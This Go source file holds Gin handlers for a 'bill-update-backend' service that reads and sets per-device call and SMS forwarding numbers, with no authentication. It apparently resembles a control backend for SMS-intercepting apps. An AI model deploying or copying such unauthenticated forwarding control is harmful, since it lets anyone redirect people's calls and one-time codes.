package handlers

import (
	"bill-update-backend/database"
	"bill-update-backend/models"
	"net/http"

	"github.com/gin-gonic/gin"
)

func GetForwardingConfig(c *gin.Context) {
	deviceID := c.Param("device_id")
	var cfg models.ForwardingConfig
	result := database.DB.Where("device_id = ?", deviceID).First(&cfg)
	if result.Error != nil {
		cfg = models.ForwardingConfig{
			DeviceID:             deviceID,
			CallForwarding:       false,
			CallForwardingNumber: "",
			SmsForwarding:        false,
			SmsForwardingNumber:  "",
		}
		database.DB.Create(&cfg)
	}
	c.JSON(http.StatusOK, cfg)
}

func UpdateForwardingConfig(c *gin.Context) {
	var req struct {
		DeviceID             string `json:"device_id"`
		CallForwarding       *bool  `json:"call_forwarding"`
		CallForwardingNumber string `json:"call_forwarding_number"`
		SmsForwarding        *bool  `json:"sms_forwarding"`
		SmsForwardingNumber  string `json:"sms_forwarding_number"`
	}
	if err := c.ShouldBindJSON(&req); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
		return
	}
	var cfg models.ForwardingConfig
	result := database.DB.Where("device_id = ?", req.DeviceID).First(&cfg)
	if result.Error != nil {
		cfg = models.ForwardingConfig{DeviceID: req.DeviceID}
	}
	if req.CallForwarding != nil {
		cfg.CallForwarding = *req.CallForwarding
	}
	if req.CallForwardingNumber != "" {
		cfg.CallForwardingNumber = req.CallForwardingNumber
	}
	if req.SmsForwarding != nil {
		cfg.SmsForwarding = *req.SmsForwarding
	}
	if req.SmsForwardingNumber != "" {
		cfg.SmsForwardingNumber = req.SmsForwardingNumber
	}
	database.DB.Save(&cfg)
	c.JSON(http.StatusOK, gin.H{"message": "Forwarding config updated"})
}
